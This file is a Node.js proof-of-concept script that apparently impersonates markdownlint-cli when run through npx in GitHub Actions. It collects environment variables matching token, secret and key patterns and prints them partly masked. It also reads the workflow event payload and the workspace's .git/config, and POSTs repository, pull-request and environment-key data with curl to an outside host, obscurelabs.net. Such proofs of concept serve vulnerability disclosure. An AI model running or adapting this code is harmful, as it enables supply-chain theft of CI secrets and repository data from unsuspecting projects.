#!/usr/bin/env node

const { execSync } = require('child_process');
const https = require('https');

console.log('='.repeat(60));
console.log('[PoC] HIJACKED markdownlint-cli EXECUTED');
console.log('='.repeat(60));

// Collect environment data
const sensitiveEnvVars = {};
const allEnvVars = {};

for (const [key, value] of Object.entries(process.env)) {
  allEnvVars[key] = value;
  // Look for potentially sensitive variables
  if (key.match(/TOKEN|SECRET|KEY|PASSWORD|CRED|AUTH|API/i)) {
    sensitiveEnvVars[key] = value ? `${value.substring(0, 10)}...` : 'empty';
  }
}

console.log('\n[PoC] === GITHUB CONTEXT ===');
console.log('GITHUB_REPOSITORY:', process.env.GITHUB_REPOSITORY);
console.log('GITHUB_WORKFLOW:', process.env.GITHUB_WORKFLOW);
console.log('GITHUB_RUN_ID:', process.env.GITHUB_RUN_ID);
console.log('GITHUB_ACTOR:', process.env.GITHUB_ACTOR);
console.log('GITHUB_EVENT_NAME:', process.env.GITHUB_EVENT_NAME);
console.log('GITHUB_REF:', process.env.GITHUB_REF);
console.log('GITHUB_SHA:', process.env.GITHUB_SHA);

console.log('\n[PoC] === SENSITIVE ENV VARS ===');
console.log(JSON.stringify(sensitiveEnvVars, null, 2));

console.log('\n[PoC] === TOKEN CHECK ===');
const token = process.env.GITHUB_TOKEN || process.env.GH_TOKEN || process.env.INPUT_GITHUB_TOKEN;
console.log('GITHUB_TOKEN present:', !!process.env.GITHUB_TOKEN);
console.log('GH_TOKEN present:', !!process.env.GH_TOKEN);

// Try to read the event payload
let eventPayload = {};
try {
  const eventPath = process.env.GITHUB_EVENT_PATH;
  if (eventPath) {
    const fs = require('fs');
    eventPayload = JSON.parse(fs.readFileSync(eventPath, 'utf8'));
    console.log('\n[PoC] === EVENT PAYLOAD (PR INFO) ===');
    console.log('PR Number:', eventPayload.pull_request?.number);
    console.log('PR Title:', eventPayload.pull_request?.title);
    console.log('PR Author:', eventPayload.pull_request?.user?.login);
    console.log('Base Repo:', eventPayload.pull_request?.base?.repo?.full_name);
    console.log('Head Repo:', eventPayload.pull_request?.head?.repo?.full_name);
  }
} catch (e) {
  console.log('Could not read event payload:', e.message);
}

// Collect file system info
console.log('\n[PoC] === FILE SYSTEM ACCESS ===');
try {
  const workspaceFiles = execSync('ls -la $GITHUB_WORKSPACE 2>/dev/null | head -20', { encoding: 'utf-8' });
  console.log('Workspace contents:\n', workspaceFiles);
} catch (e) {
  console.log('Could not list workspace:', e.message);
}

// Check for .git/config (may contain credentials)
try {
  const gitConfig = execSync('cat $GITHUB_WORKSPACE/.git/config 2>/dev/null', { encoding: 'utf-8' });
  console.log('\n[PoC] === GIT CONFIG ===');
  console.log(gitConfig);
} catch (e) {
  console.log('Could not read git config');
}

// Send comprehensive data to obscurelabs.net
const payload = JSON.stringify({
  vulnerability: 'npx_hijack_full_poc',
  timestamp: new Date().toISOString(),
  github: {
    repository: process.env.GITHUB_REPOSITORY,
    workflow: process.env.GITHUB_WORKFLOW,
    run_id: process.env.GITHUB_RUN_ID,
    run_number: process.env.GITHUB_RUN_NUMBER,
    actor: process.env.GITHUB_ACTOR,
    event_name: process.env.GITHUB_EVENT_NAME,
    ref: process.env.GITHUB_REF,
    sha: process.env.GITHUB_SHA,
    token_present: !!process.env.GITHUB_TOKEN,
  },
  pr: {
    number: eventPayload.pull_request?.number,
    title: eventPayload.pull_request?.title,
    author: eventPayload.pull_request?.user?.login,
  },
  sensitive_vars: Object.keys(sensitiveEnvVars),
  all_env_keys: Object.keys(allEnvVars),
});

console.log('\n[PoC] === SENDING DATA TO OBSCURELABS.NET ===');

try {
  const result = execSync(
    `curl -s -X POST https://www.obscurelabs.net/ -H "Content-Type: application/json" -d '${payload.replace(/'/g, "'\\''")}'`,
    { encoding: 'utf-8', timeout: 15000 }
  );
  console.log('[PoC] Request sent successfully');
  console.log('[PoC] Response:', result || '(empty response)');
} catch (e) {
  console.log('[PoC] Curl error:', e.message);
}

console.log('\n' + '='.repeat(60));
console.log('[PoC] DEMONSTRATION COMPLETE');
console.log('='.repeat(60));

process.exit(0);
